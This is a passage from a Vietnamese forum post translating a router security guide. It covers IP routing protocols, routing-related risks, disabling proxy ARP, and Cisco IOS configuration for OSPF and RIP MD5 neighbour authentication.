cả các ví dụ trong phần này đều dựa trên kiến trúc mạng trên hình 4-1<br/><br/> Giao thức tuyến định<br/> Thông dụng nhất là cặp TCP/IP; cơ sở của nó là Giao thức mạng Internet Protocol IP. Phần này không đi sâu vào giao thức này, vì nó vượt quá phạm vi tài liệu hướng dẫn này, xem [6] để biết thêm hướng dẫn. ARPA đã tài trợ cho việc phát triển IP trong hơn 25 năm qua trong dự án ARPANET. Ngày nay, nó là nền tảng của Internet toàn cầu. Sự lớn mạnh và phổ biến của nó có thể qui cho khả năng kết nối các mạng máy tính khác nhau bất kể môi trường vật lý nào, và do bản chất linh hoạt và mở của kiến trúc mạng IP.<br/> IP được thiết kế để sử dụng trên các mạng lớn; bằng cách sử dụng IP, một máy chủ kết được nối bất cứ đâu trên mạng có thể giao tiếp với bất cứ mày nào khác. Trong thực tế, các ứng dụng máy chủ hầu như không bao giờ sử dụng IP thô để giao tiếp. Thay vào đó, chúng dùng một trong 2 phương thức truyền tải qua lớp được xây dựng dựa trên IP: đó là TCP (Transmission Control Protcol = Giao thức điều khiển số liệu) hoặc UDP (User Datagram Protocol = Giao thức gam dữ liệu người dùng). Việc dùng TCP hay UDP đều không liên quan gì đến việc định tuyến (có vai trò dành riêng ở lớp mạng). Từng máy chủ IP không cần biết đường trong mạng để đến với máy chủ khác mà chỉ cần biết địa chỉ của một hoặc một số nhỏ các router. Các router đó có nhiệm vụ chỉ đường cho từng gói tin IP đến chỗ nó cần đến.<br/> Trong một mạng nhỏ, từng router có thể chỉ đơn giản nối trực tiếp tới các router khác. Dĩ nhiên trong các mạng lớn, làm như thế rất tốn kém. Thay vì làm như vậy, từng router duy trì một bảng tuyến trong đó có thông tin về cách chuyển các gói tin đến địa chỉ của chúng. Đối với bất kì mạng IP lớn nào, thao tác này có chính xác, có hiệu quả, có bảo mật hay không đều tùy thuộc vào sự toàn vẹn của bảng tuyến của mạng đó. Để có thêm thông tin chi tiết về các khái niệm định tuyến, xem [6].<br/> Bảng tuyến và Giao thức định tuyến<br/> Nhiệm vụ cơ bản của một router là gửi gói tin đến địa chỉ đã định. Để thực hiện điều này, từng router cần một bảng tuyến. Từng router xây dựng bảng tuyến cho nó dựa trên thông tin từ mạng và từ các quản trị viên. Sau đó router dùng một tập hợp phép đo lường, tùy vào nội dung của bảng tuyến và thuật toán định tuyến của nó, để so sánh các tuyến rồi quyết định đường tới đích tốt nhất. Router dùng 4 kĩ thuật cơ bản sau để xây dựng bảng tuyến:<br/> 1. Kết nối trực tiếp: Bất cứ phần nào của mạng LAN mà router kết nối trực tiếp đều tự động được thêm vào bảng tuyến. Ví dụ, router Central nối với phần mạng LAN 14.2.9.0/24.<br/> 2. Định hướng tĩnh: Với vai trò là người quản trị mạng, bạn có thể xác lập cho router sử dụng một tuyến cho trước đến một đích xác định. Phương pháp này thường trước sau gì cũng dùng khi đã dùng các phương pháp khác<br/> 3. Định tuyến động: Dùng router cập nhật thông điệp từ các router khác để tạo tuyến. Thuật toán định tuyến đi với từng giao thức định tuyến xác định sẽ quyết định đường dẫn tối ưu tới đích và cập nhật bảng tuyến. Phương pháp này linh động nhất bởi nó có thể tự động cập nhật những thay đổi trong mạng.<br/> 4. Định tuyến mặc định: Dùng tuyến được nhập vào thủ công tới ‘cổng vào của lần dùng cuối’ cụ thể khi các cơ cấu định tuyến khác không nhận biết được tuyến. Phương pháp này hữu dụng nhất cho các router ở biên và các router có vai trò như kết nối nền giữa một mạng LAN nhỏ và mạng lớn như Internet. Các router dựa vào một cổng vào mặc định duy nhất thường không dùng các giao thức định tuyến<br/> Mặc dù có nhiều giao thức định tuyến động nhưng có thể chia chúng ra 2 nhóm: nhóm giao thức cổng trong và nhóm giao thức cổng ngoài. Một IGP (Interior Gateway Protocol = giao thức cổng trong) được dùng để trao đổi thông tin tuyến giữa các cổng nằm trong một hệ thống độc lập. Một hệ thống độc lập là một nhóm các thành phần mạng dưới một tên miền được quản lý. Các cổng nằm trong hệ thống độc lập sử dụng thông tin tuyến được truyền bởi các thông điệp IGP để phân luồng lưu lượng. Một EGP (Exterior Gateway Protocol = Giao thức cổng ngoài) được dùng để trao đổi thông tin tuyến giữa các hệ thống độc lập. Theo tiêu chuẩn, mặc dù không phổ biến, thì các IGP được giao việc trên các router trong, và các EGP thì trên các router xương sống. Các router biên có thể dùng một trong hai hay cả hai tùy thuộc vào cấu trúc mạng tìm thấy chúng. BGP-4 (Border Gateway Protocol version 4 = Giao thức cổng biên phiên bản 4) là EGP dùng để truyền thông tin giữa các mạng độc lập trên Internet. Phần này tập trung vào một số nhỏ các giao thức định tuyến thông dụng như: RIP, OSPF, BGP và EIGRP. 3 giao thức đầu theo chuẩn IETF, giao thức còn lại EIGRP còn lại do nhà đầu tư xác định. RIP, viết tắt của Routing Information Protocol (giao thức thông tin định tuyến), là một ví dụ về IGP định hướng từ xa. OSPF, Open Shortest Path First = Mở đường ngắn nhất trước, là một ví dụ về IGP của trạng thái đường nối. BGP-4 là EGP theo chuẩn IETF. EIGRP, giao thức định tuyến cổng trong mở rộng, là một IGP của riêng Cisco, thường được dùng trong tất cả các mạng Cisco. Dưới đây là bảng so sánh ngắn.<br/> Bảng 4-2 – 4 giao thức định tuyến IP phổ biến<br/><br/> RIP Giao thức định hướng từ xa: duy trì một danh sách các khoảng cách tới các mạng khác đo bằng bước nhảy, số router một gói tin phải đi ngang qua để đến đích. Bị giới hạn về kích cỡ vì khoảng cách nào quá 15 bước nhảy thì không thể tới được. Trạm truyền thông 30 giây cập nhật 1 lần tất cả các router RIP gần nó. Mỗi bản cập nhật là một bảng tuyến. RIP thích hơp cho các mạng nhỏ<br/> OSPF Giao thức trạng thái đường truyền: sử dụng đơn vị đo dựa trên tốc độ đường truyền để quyết định đường tới các mạng khác. Mỗi router duy trì một bản đồ giản lược của toàn bộ mạng. Các bản cập nhật được gửi bằng kĩ thuật multicast và được gửi chỉ khi nào cấu hình của mạng thay đổi. Mỗi bản cập nhật chỉ bao gồm những thay đổi đến mạng. OSPF thích hợp cho các mạng lớn<br/><br/> EIGRP Giao thức định hướng từ xa: duy trì một tập hợp các đơn vị đo lường phức tạp đo khoảng cách đến các mạng khác và kết hợp chặt chẽ với vài tính năng của các giao thức trạng thái đường truyền. Trạm truyền thông cứ 90 giây cập nhật một lần cho tất cả các EIGRP gần nó. Mỗi bản cập nhật chỉ bao gồm các thay đổi đến mạng. EIGRP thích hợp các cho mạng lớn.<br/> BGP Một giao thức cổng ngoài định hướng từ xa nhờ một nhóm các qui tắc duy trì các con đường tới các mạng. Các bản cập nhật được gửi trên khắp các kết nối TCP giữa các đẳng đã được xác định cụ thể. BGP-4 nhờ khối tuyến hỗ trợ các mạng cực lớn như Internet.<br/> Một khía cạnh quan trọng nữa của lược đồ giao thức định tuyến là lượng thời gian cần thiết để kiến trúc mạng hay những thay đổi về kết nối đựơc thể hiện trong bảng tất cả các router bị ảnh hưởng. Khía cạnh này thường được gọi là tốc đô hội tụ. Ví dụ, trong một mạng lớn OSPF nhanh hơn nhiều so với RIP.<br/> Việc cấu hình định tuyến trong các mạng IP có thể là công việc phức tạp, và cũng nằm ngoài phạm vi của hướng dẫn này. Định tuyến chắc chắn tạo ra nhiều vấn đề về bảo mật, và IOS của Cisco cung cấp nhiều dịch vụ bản mật trong quá trình định tuyến; Phần này bàn luận vài vấn đề bảo mật và mô tả tương đối chi tiết nhiều dịch vụ bảo mật. Để biết các hướng dẫn chung về các giao thức định tuyến, xem tài liệu của Cisco hoặc [3].<br/> 4.4.1. Các rủi ro thường gặp khi định tuyến<br/> Một câu hỏi thường không được chú ý là “Tại sao ta lại phải cần chuốc lấy lo lắng về bảo mật mạng?”. Một câu hỏi hay hơn là “Kẻ phá hoại có thể gây những tổn thất nào đến mạng của ta?” Phần 3 giới thiệu vài động cơ thúc đẩy bảo mật router toàn diện. Phần này tập trung vào các vấn đề bảo mật liên quan đến định tuyến và giao thức định tuyến. Bảo mật quá trình định tuyến cần là một ưu tiên hàng đầu đối với các quản trị viên muốn:<br/> Ngăn cản sự truy cập trái phép đến tài nguyên mạng,<br/> Bảo vệ thông tin nhiệm vụ tránh bị phơi bày và sửa chữa không được phép,<br/> Ngăn cản sự gián đoạn và từ chối thực thi trong dịch vụ<br/><br/> Router hoặc tên miền định tuyến không được bảo vệ sẽ trở thành một mục tiêu cho các kẻ tấn công có hiểu biết về mạng. Ví dụ, kẻ tấn công gửi các gói tin cập nhật định tuyến không đúng đến một router không được bản vệ có thể dễ dàng gây bất ổn cho bảng tuyến của router. Bằng cách này, kẻ tấn công có thể định lại tuyến của các lưu lượng trên mạng theo ý muốn. Chìa khóa để ngăn ngừa những kiểu tấn công như vậy là bảo vệ bảng tuyến tránh các thay đổi không phép và nguy hiểm. Có 2 lối tiếp cận cơ bản nhằm bảo vệ sự ổn định của bảng tuyến:<br/><br/> 1. Sử dụng các tuyến tĩnh –<br/> Có thể phù hợp với mạng nhỏ, nhưng không ổn định trong mạng lớn.<br/> 2. Chứng thực các bản cập nhật bảng tuyến –<br/> Bằng cách dùng giao thức đinh tuyến có chứng thực, các quản trị mạng có thể phát hiện ra các đợt tấn công dựa trên các thay đổi định tuyến không phép. Các bản cập nhật được chứng thực chắc rằng các thông điệp cập nhật đến từ các nguồn xác thực, các thông điệp không thật sẽ tự động được hủy bỏ.<br/> Một dạng tấn công khác một kẻ phá hoại có thể cố đối với router là dạng tấn công từ chối dịch vụ. Dạng này có thể thực hiện bằng rất nhiều cách. Ví dụ, việc ngăn cản các thông điệp cập nhật router gửi đi hay nhận và sẽ dẫn đến sự hạ xuống của vài phần của mạng. Để kháng cự các đợt tấn công từ chối dịch vụ và hồi phục nhanh chóng, các router cần các tuyến sao lưu và hội tụ mau lẹ.<br/> 4.4.2. ARP và các mạng LAN<br/> Tuy nhiên vì ARP cũng như ARP proxy đều không có bản mật. Điểm yếu bảo mật chủ yếu của ARP là ở chỗ nó không phải được thiết kế để dùng bất kì xác lập chứng thực nào. Bất cứ ai trên phần mạng LAN đều có thể sửa đổi mục vào của cạc (cache) ARP của router phục vụ phần mạng đó. Vì thế, nếu một máy chủ trên mạng không dùng các cổng vào mặc định nhưng thay vào đó là dùng các ARP proxy để xử lý quá trình định tuyến thì điều này cũng dễ xảy ra với các tuyến xấu và nguy hiểm. Trong bất cứ trường hợp nào, không nên dùng ARP proxy nữa và nên vô hiệu hóa nó. Ví dụ sau mô tả cách làm.<br/><br/> Central# config t<br/> Enter configuration commands, o¬ne per line. End with CNTL/Z.<br/> Central(config)# interface ethernet0/0<br/> Central(config-if)# no ip proxy-arp<br/> Central(config-if)# exit<br/> Central(config)# interface ethernet0/1<br/> Central(config-if)# no ip proxy-arp<br/> Central(config-if)# end<br/> Central#<br/> 4.4.3. Các bảng tuyến, các tuyến tĩnh và các giao thức định tuyến<br/> Phần này mô tả cách bảo vệ router tránh các rủi ro thường thấy khi định tuyến. Phần này tập trung vào việc sử dụng chứng thực router ngang hàng với các giao thức cổng trong. Vài chỉ dẫn về bảo mật cho các giao thức một cổng ngoài, BGP-4, được dành riêng vào phần 4.4.5.<br/> Chứng thực router lân cận<br/> Mục đích cơ bản của chứng thực router lân cận là bảo vệ sự bền vững của một tên miền định tuyến. Trong trường hợp này, chứng thực xảy ra khi 2 router lân cận trao đổi thông tin định tuyến. Chứng thực sẽ bảo đảm router nhận sát nhập vào bảng tuyến của nó các thông tin tuyến mà router gửi đã được chứng thực thực thực sự định gửi. Việc này ngăn cản một router đã được chứng thực chấp nhận và thực thi các bản cập nhật không phép, nguy hiểm, hoặc gián đoạn có thể nguy hại tới bảo mật hay hiệu lực của mạng. Một nguy hại như thế có thể dẫn đến nguy cơ định tuyến lại các lưu lượng, một sự từ chối dịch vụ, hay đơn giản cho phép một người không được phép quyền truy cập các gói tin nhất dịnh.<br/> Chứng thực OSPF<br/> Chứng thực router lân cận là một cơ chế mà khi được áp dụng đúng đắn có thể ngăn ngừa nhiều đợt tấn công định tuyến. Mội một router thực hiện chứng thực bằng khóa chứng thực mà chúng có. Có nghĩa là tất cả các router nối tới cùng phần mạng cùng dùng một khóa mật chung. Từng router gửi sau đó dùng khóa này để đánh dấu thông điệp cập nhật bảng tuyến. Router nhận kiểm tra khóa chung để quyết định thông điệp có nên nhận hay không. Phần này mô tả cách thiết lập chứng thực router lân cận trong OSPF, vì nó là một minh họa sinh động cho nguyên tắc cơ bản này; chứng thực trong RIP phiên bản 2 và EIGRP tương tự.<br/> OSPF dùng 2 loại chứng thực lân cận: văn bản thô và thông điệp mã hóa MD5. Chứng thực văn bản thô dùng khóa chung của mọi router trên phần mạng. Khi một router gửi xây dựng một gói tin OSPF, nó đánh dấu gói tin bằng cách thay khóa bằng văn bản thô vào trong phần đầu của OSPF. Router nhận sau đó sẽ so sánh khóa nhận được với khóa trong bộ nhớ. Nếu 2 khóa trùng nhau thì router nhận chấp nhận gói tin. Bằng không thì router nhận bãi bỏ gói tin. Phương thức này không bảo mật cao vì khóa được lưu trong gói tin dưới dạng văn bản thô. Dùng cách này sẽ làm lộ khóa mật cho kẻ tấn công dùng thiết bị dò mạng vào đúng phần mạng LAN nạn nhân. Một khi kẻ tấn công lấy được khóa mật rồi, chúng có thể làm rối một router đã chứng thực. Phương thức thứ hai, bảo mật hơn, là chứng thực thông điệp đã được mã hóa. Hình 4-3 cho thấy một ví dụ về mạng với các giao thức định tuyến của nó.<br/><br/> Trong ví dụ này, các router North, East và Central cùng chung khóa mật, r0utes-4-all, ID của khóa là 1. Mỗi khóa chứng thực nhau sử dụng phương thức chứng thực mã hóa MD5, giá trị chứng thực mã hóa giả sử là 2. Hình 4-4 cho thấy East chứng thực qua North. Đầu tiên East xây dựng một gói tin OSPF, cả phần đầu lẫn phần thân. Sau đó nó lấy một khóa chính để dùng trên phần mạng. Trong trường hợp này, khóa đó là r0utes-4-all. ID tương ứng của khóa, 1, được đặt ở phần đầu gói tin. East đồng thời cũng đặt một dãy số 32 bit vào phần đầu gói tin. Dãy số này bảo vệ tránh những đợt tấn công lặp lại sao cho không có 2 gói tin OSPF nào có cùng giá trị băm. Dãy số này tăng 1 đơn vị mỗi khi có gói tin mới. Cuối cùng, khóa mật được nối thêm vào gói tin. East thực thi thuật toán băm mã hóa, MD5, cho gói tin OSPF. Kết quả, 16 byte, được viết chồng lên khóa mật đã được nối thêm vào gói tin.<br/> Router nhận, North, dựa vào ID của khóa để quyết định khóa nào đã được dùng để sinh mã băm hay kí hiệu xác nhận. Sau đó router nhận dùng khóa của nó để sinh lại mã băm cho gói tin đã nhận theo cùng cách mà router gửi đã làm. Nếu mã băm vừa sinh ra phù hợp với mã băm được gửi từ router East thì router North sẽ chấp nhận gói tin. Bằng không thì nó sẽ coi như gói tin không hợp lệ và hủy.<br/><br/> Chứng thực văn bản OSPF<br/> Phương thức này kiến nghị không nên dùng, dùng phương thức MD5 tốt hơn, xem bên dưới.<br/> Chứng thực mã hóa MD5 OSPF<br/> Ví dụ dưới đây minh họa một ví dụ về thiết lập MD5 cho chứng thực lân cận router OSPF. Các bản ghi của ví dụ dưới đây cho thấy các router North và East nhận khóa r0utes-4-all. Thực tế thì tất cả các router tham gia vào mạng đã cho nên được cấu hình tương tự dùng cùng khóa. Dùng ví dụ mạng ở hình 4-1, router Central cũng sẽ phải được cấu hình chứng thực MD5 và dùng cùng khóa như bên dưới đây.<br/><br/> North# config t<br/> Enter configuration commands, o¬ne per line. End with CNTL/Z.<br/> North(config)# router ospf 1<br/> North(config-router)# network 14.1.0.0 0.0.255.255 area 0<br/> North(config-router)# area 0 authentication message-digest<br/> North(config-router)# exit<br/> North(config)# int eth0/1<br/> North(config-if)# ip ospf message-digest-key 1 md5 r0utes-4-all<br/> North(config-if)# end<br/> North#<br/> East# config t<br/> Enter configuration commands, o¬ne per line. End with CNTL/Z.<br/> East(config)# router ospf 1<br/> East(config-router)# area 0 authentication message-digest<br/> East(config-router)# network 14.1.0.0 0.0.255.255 area 0<br/> East(config-router)# network 14.2.6.0 0.0.0.255 area 0<br/> East(config-router)# exit<br/> East(config)# int eth0<br/> East(config-if)# ip ospf message-digest-key 1 md5 r0utes-4-all<br/> East(config-if)# end<br/> East#<br/> Chứng thực RIP<br/> Giao thức định tuyến RIP cũng hỗ trợ chứng thực đề ngăn ngừa các đợt tấn công. Phương thức chứng thực của RIP rất giống với của OSPF mặc dù các lệnh IOS có hơi khác nhau. Các router RIP lân cận dùng chung các khóa mật. Mỗi router gửi sử dụng các khóa này để sinh mã băm sát nhập vào từng thông điệp cập nhật RIP. Router gửi sau đó dùng khóa mật chung để kiểm tra giá trị băm và quyết định thông điệp có được chấp nhận hay không.<br/><br/> Chứng thực văn bản thô RIP<br/> Phương thức này kiến nghị không nên dùng, dùng phương thức MD5 tốt hơn dưới đây.<br/><br/> Chứng thực MD5 cho RIP<br/> Ví dụ dưới đây minh họa một ví dụ về cách thiết lập MD5 cho chứng thực lân cận router RIP. Các bản ghi của ví dụ bên dưới cho thấy các router trong hình 4-3, Central và South, nhận khóa my-supersecret-key, lần lượt chứa trong chuỗi khóa của chúng. Thực tế, tất cả các router nối với một mạng đã cho phải được cấu hình tương tự. Có nghĩa là tất cả các router phải có một hoặc nhiều khóa chung. Trước khi kích hoạt chứng thực MD5 cho RIP, từng router lân cận phải có một khóa chung. RIP quản lý các khóa chứng thực bằng việc dùng chuỗi khóa. Một chuỗi khóa là một nơi chứa nhiều khóa với ID của khóa đi kèm và thời gian tồn tại của chúng. Nhiều khóa với thời gian sống khác nhau có thể tồn tại. Tuy thế chỉ có một gói tin chứng thực được gửi đi. Router kiểm tra các số khóa theo thứ tự từ thấp đến cao và sử dụng khóa hợp lệ đầu tiên nó bắt gặp được.<br/> HVA-Translator group<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right">					
		<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap" align="right">
				<form action="" name="p" id="p" accept-charset="UTF-8"> 
					
					<span class="gensmall">Go to Page:&nbsp;</span>
					
						<a href="/hvaonline/posts/listByUser/29098.html">
							<img src="/hvaonline/templates/viet/images/icon_first_page.gif" width="8" height="9" alt="First Page" title="First Page"/>
						</a>
								<a href="/hvaonline/posts/listByUser/330/29098.html">
									<img src="/hvaonline/templates/viet/images/icon_prev_page.gif" width="5" height="9" alt="Page 12" title="Page 12"/>
								</a>
							
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/360/29098.html">13</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/390/29098.html">14</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/420/29098.html">15</a></span>
							
					
						<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/posts/listByUser/'+ ( (this.options[this.selectedIndex].value - 1) * 30)  + '/29098' + '.html'; }" name="select2">
							<option value="-1" selected="selected">---</option>		
							
								<option value="1" >1</option>	
								<option value="2" >2</option>	
								<option value="3" >3</option>	
								<option value="4" >4</option>	
								<option value="5" >5</option>	
								<option value="6" >6</option>	
								<option value="7" >7</option>	
								<option value="8" >8</option>	
								<option value="9" >9</option>	
								<option value="10" >10</option>	
								<option value="11" >11</option>	
								<option value="12" >12</option>	
								<option value="13" >13</option>	
								<option value="14" >14</option>	
								<option value="15" >15</option>	
								<option value="16" selected="selected">16</option>	
								<option value="17" >17</option>	
						</select>
						
							<a href="/hvaonline/posts/listByUser/480/29098.html">
								<img src="/hvaonline/templates/viet/images/icon_next_page.gif" width="5" height="9" alt="Page 17" title="Page 17"/>
							</a>
						
						<a href="/hvaonline/posts/listByUser/480/29098.html">
							<img src="/hvaonline/templates/viet/images/icon_last_page.gif" width="8" height="9" alt="Last Page" title="Last Page (17)"/>
						</a>
				</form>
			</td>
		</tr>
		</table>
</td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.html" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
